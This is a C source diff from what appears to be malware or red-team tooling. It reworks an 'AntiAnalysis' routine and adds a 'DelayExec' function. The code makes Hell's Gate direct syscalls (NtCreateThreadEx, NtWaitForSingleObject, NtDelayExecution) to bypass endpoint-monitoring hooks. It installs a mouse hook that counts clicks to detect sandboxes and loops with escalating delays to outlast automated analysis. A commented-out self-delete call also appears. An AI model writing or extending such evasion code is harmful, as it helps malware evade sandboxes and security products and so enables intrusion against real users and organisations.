@@ -155,63 +155,121 @@ BOOL InstallMouseHook() {
 	return TRUE;
 }
 
-BOOL AntiAnalysis(DWORD dwMilliSeconds) 
+BOOL DelayExec(DWORD dwMilliSeconds) {
+	NTSTATUS status = 0;
+	LONGLONG delay = 0;
+	LARGE_INTEGER delayInterval = { 0 };
+
+	delay = (LONGLONG)dwMilliSeconds * 10000;
+	delayInterval.QuadPart = -delay;
+
+	printf("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));
+
+	DWORD T0 = GetTickCount64();
+
+	HellsGate(g_SyscallsTable.NtDelayExecution.wSystemCall);
+	status = HellDescent(
+		FALSE,
+		&delayInterval
+	);
+	if (status && status != STATUS_TIMEOUT) {
+		printf("[!] NtDelayExecution Failed With Error: 0x%0.8X \n", status);
+		return FALSE;
+	}
+
+	DWORD T1 = GetTickCount64();
+
+	if ((DWORD)(T1 - T0) < dwMilliSeconds)
+		return FALSE;
+
+	printf("\n\t>> _T1 - _T0 = %d \n", (DWORD)(T1 - T0));
+	printf("[+] DONE \n");
+
+	return TRUE;
+}
+
+
+BOOL AntiAnalysis(DWORD dwMilliSeconds)
 {
 	NTSTATUS		status = 0x0;
 	HANDLE			hThread = NULL;
 	LONGLONG		delay = 0;
 	LARGE_INTEGER	delayInterval = { 0 };
+	DWORD			i = 0;
 
-	printf("[#] Monitoring Mouse-Clicks For %d Seconds - Need %d Clicks To Pass\n", (dwMilliSeconds / 1000), REQUIRED_CLICKS);
+	// Self-Delete the file on disk
+	//if (!SelfDelete()) {
 
-	// Creating a thread that runs 'InstallMouseHook' function
-	HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
-	status = HellDescent(
-		&hThread,
-		THREAD_ALL_ACCESS,
-		NULL,
-		GetCurrentProcessHandle(),
-		InstallMouseHook,
-		NULL, NULL, NULL, NULL, NULL
-	);
+	//}
 
-	if (status) {
-		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
-		return FALSE;
+	while (++i <= 10) {
+		printf("[#] Monitoring Mouse-Clicks For %d Seconds - Need %d Clicks To Pass\n", (dwMilliSeconds / 1000), REQUIRED_CLICKS);
+
+		// Creating a thread that runs 'InstallMouseHook' function
+		HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
+		status = HellDescent(
+			&hThread,
+			THREAD_ALL_ACCESS,
+			NULL,
+			GetCurrentProcessHandle(),
+			InstallMouseHook,
+			NULL, NULL, NULL, NULL, NULL, NULL
+		);
+
+		if (status) {
+			printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
+			return FALSE;
+		}
+
+		// Waiting for the thread for 'dwMilliSeconds'
+		HellsGate(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
+		delay = (LONGLONG)dwMilliSeconds * 10000;
+		delayInterval.QuadPart = -delay;
+		status = HellDescent(
+			hThread,
+			FALSE,
+			&delayInterval
+		);
+
+		if (status && status != STATUS_TIMEOUT) {
+			printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
+			return FALSE;
+		}
+
+		HellsGate(g_SyscallsTable.NtClose.wSystemCall);
+		status = HellDescent(hThread);
+
+		if (status) {
+			printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
+			return FALSE;
+		}
+
+		// Unhooking
+		if (g_hMouseHook && UnhookWindowsHookEx(g_hMouseHook) == FALSE) {
+			printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
+			return FALSE;
+		}
+		printf("[+] DONE!\n");
+
+
+		// Delaying execution for specific amount of time
+		FLOAT delayTime = i * 10000;
+		if (!DelayExec((DWORD)(delayTime / 2)))
+			return FALSE;
+
+		// If the user clicked more than REQUIRED_CLICKS times, we return true
+		if (g_dwMouseClicks > REQUIRED_CLICKS)
+			return TRUE;
+		else {
+			printf("[i] Number Of Clicks: %d. %s Analyzed!!! \n",
+				g_dwMouseClicks,
+				g_dwMouseClicks < REQUIRED_CLICKS ? "Is Being" : "Not Is Being"
+			);
+
+			// If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
+			g_dwMouseClicks = 0;
+		}
 	}
-
-	// Waiting for the thread for 'dwMilliSeconds'
-	HellsGate(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
-	delay = (LONGLONG)dwMilliSeconds * 10000;
-	delayInterval.QuadPart = -delay;
-	status = HellDescent(
-		hThread,
-		FALSE,
-		&delayInterval
-	);
-
-	if (status && status != STATUS_TIMEOUT) {
-		printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
-		return FALSE;
-	}
-
-	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
-	status = HellDescent(hThread);
-	if (status) {
-		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
-		return FALSE;
-	}
-
-	// Unhooking
-	if (g_hMouseHook && UnhookWindowsHookEx(g_hMouseHook) == FALSE) {
-		printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
-	printf("[+] DONE!\n");
-	printf("[i] Number Of Clicks: %d. %s Analyzed!!! \n", 
-		g_dwMouseClicks, 
-		g_dwMouseClicks < REQUIRED_CLICKS ? "Is" : "Not Is"
-	);
 
 	return TRUE;
 }
